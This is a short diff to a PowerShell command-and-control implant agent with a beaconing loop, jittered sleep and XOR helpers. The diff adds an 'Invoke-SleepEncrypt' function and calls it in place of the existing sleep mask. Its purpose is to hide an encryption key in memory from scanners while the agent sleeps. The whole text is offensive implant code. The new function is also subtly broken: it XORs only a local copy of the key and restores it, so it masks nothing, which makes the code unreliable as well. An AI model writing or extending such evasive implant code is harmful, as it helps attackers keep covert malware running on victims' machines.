@@ -31,6 +31,16 @@ function Invoke-XORDecryption {
     return [System.Text.Encoding]::UTF8.GetString($decrypted)
 }
 
+function Invoke-SleepEncrypt {
+    param([int]$Seconds)
+    $secret = [Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
+    $key = New-Object byte[] 16
+    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
+    for ($i = 0; $i -lt $secret.Length; $i++) { $secret[$i] = $secret[$i] -bxor $key[$i % 16] }
+    Start-Sleep -Seconds $Seconds
+    for ($i = 0; $i -lt $secret.Length; $i++) { $secret[$i] = $secret[$i] -bxor $key[$i % 16] }
+}
+
 function Invoke-SleepMask {
     param([int]$Seconds)
     $src = [Text.Encoding]::UTF8.GetBytes('sockpuppets-sleep-mask')
@@ -237,7 +247,7 @@ function Start-Agent {
 
             # Sleep with jitter
             $sleepTime = Get-SleepTime -BaseInterval $beaconInterval -JitterPercent $beaconJitter
-            Invoke-SleepMask -Seconds $sleepTime
+            Invoke-SleepEncrypt -Seconds $sleepTime
 
         } catch {
             Start-Sleep -Seconds $RECONNECT_DELAY
